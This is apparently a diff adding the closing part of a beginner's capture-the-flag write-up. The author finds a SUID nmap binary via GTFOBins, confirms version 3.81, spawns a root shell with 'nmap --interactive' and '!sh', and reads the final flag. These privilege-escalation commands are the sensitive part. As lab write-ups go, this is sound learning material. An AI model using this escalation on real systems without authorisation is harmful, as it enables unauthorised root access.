@@ -280,3 +280,41 @@ Now I need to try to get the root user. I can grab a linpeas.sh script and run t
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/pt_chown
 ```
+
+I compare each binary on the [GTFOBins website](https://gtfobins.github.io/) to see if any of these binaries have the a SUID vulnerability. It turns out that we have one!
+
+Nmap has a vulnerability with SUID. The [GTFOBins website](https://gtfobins.github.io/) says the following:
+
+```bash
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+...
+(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+
+nmap --interactive
+nmap> !sh
+```
+
+So I verify that the installed nmap is between those 2 version numbers. I run the following command:
+
+`/usr/local/bin/nmap --version`
+
+The version is 3.81, it is vulnerable! I run the following commands:
+
+```bash
+/usr/local/bin/nmap --interactive
+!sh
+```
+
+I notice the shell prompt has the `#` character at the end. That is the symbol for root. I confirm this by typing `whoami` and it outputs root.
+
+I am in!
+
+I go to the `/root` folder and cat the final flag:
+
+`cat key-3-of-3.txt`
+
+#### Conclusion
+
+This was my first capture the flag machine. I really enjoyed every part of it. When I ran this machine, I needed help with a few parts. I ended up watching some videos and reading some guides. 
